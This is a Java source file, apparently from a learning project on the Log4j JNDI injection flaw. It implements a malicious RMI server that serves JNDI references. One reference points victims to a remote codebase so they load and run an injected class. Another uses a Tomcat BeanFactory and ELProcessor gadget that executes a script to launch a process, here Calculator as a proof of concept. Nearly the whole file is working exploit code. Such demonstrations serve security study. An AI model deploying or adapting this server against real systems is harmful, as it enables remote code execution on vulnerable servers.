package com.git.hui.boot.log4j.rmi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;
import com.sun.naming.internal.VersionHelper;
import org.apache.naming.ResourceRef;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.Naming;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;
import java.util.Hashtable;

/**
 * @author yihui
 * @date 21/12/13
 */
public class RmiServer {

//    public static void main(String[] args) throws Exception {
////        Class clz = VersionHelper.getVersionHelper().loadClass("Inject", "http://127.0.0.1:9999/");
////        System.out.println(clz);
//
//
//        Registry registry = LocateRegistry.createRegistry(8181);
//        // 创建一个远程对象
//        HelloService hello = new HelloServiceImpl();
////        registry.bind("hello", hello);
//
//        Naming.bind("rmi://localhost:8181/hello", hello);
//        System.out.println("服务已启动");
//        Thread.currentThread().join();
//    }

    private static void ref() throws Exception {
        Registry registry = LocateRegistry.createRegistry(8181);
        Reference reference = new Reference("Inject", "Inject", "http://127.0.0.1:9999/");
        ReferenceWrapper wrapper = new ReferenceWrapper(reference);
        registry.rebind("inject", wrapper);
    }

    private static void tomcatRef() throws Exception {
        LocateRegistry.createRegistry(8181);
        ResourceRef ref = new ResourceRef("javax.el.ELProcessor", null, "", "", true,"org.apache.naming.factory.BeanFactory",null);
        ref.add(new StringRefAddr("forceString", "x=eval"));
        ref.add(new StringRefAddr("x", "\"\".getClass().forName(\"javax.script.ScriptEngineManager\").newInstance().getEngineByName(\"JavaScript\").eval(\"new java.lang.ProcessBuilder['(java.lang.String[])'](['/Applications/Calculator.app/Contents/MacOS/Calculator']).start()\")"));
        ReferenceWrapper referenceWrapper = new ReferenceWrapper(ref);
        Naming.bind("rmi://127.0.0.1:8181/inject", referenceWrapper);
    }


    public static void main(String[] args) throws Exception {
        tomcatRef();
        System.out.println("服务已启动");
        Thread.currentThread().join();
    }

//    public static void main(String[] args) throws Exception {
//        HelloService helloService = new HelloServiceV2();
//        // 使用JDNI在命名服务中发布引用
//        Hashtable env = new Hashtable();
//        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.cosnaming.CNCtxFactory");
//        env.put(Context.PROVIDER_URL, "iiop://127.0,0,1:8181");
//        InitialContext initialContext = new InitialContext(env);
//        initialContext.rebind("hello", helloService);
//        System.out.println("服务已启动");
//        Thread.currentThread().join();
//    }

}
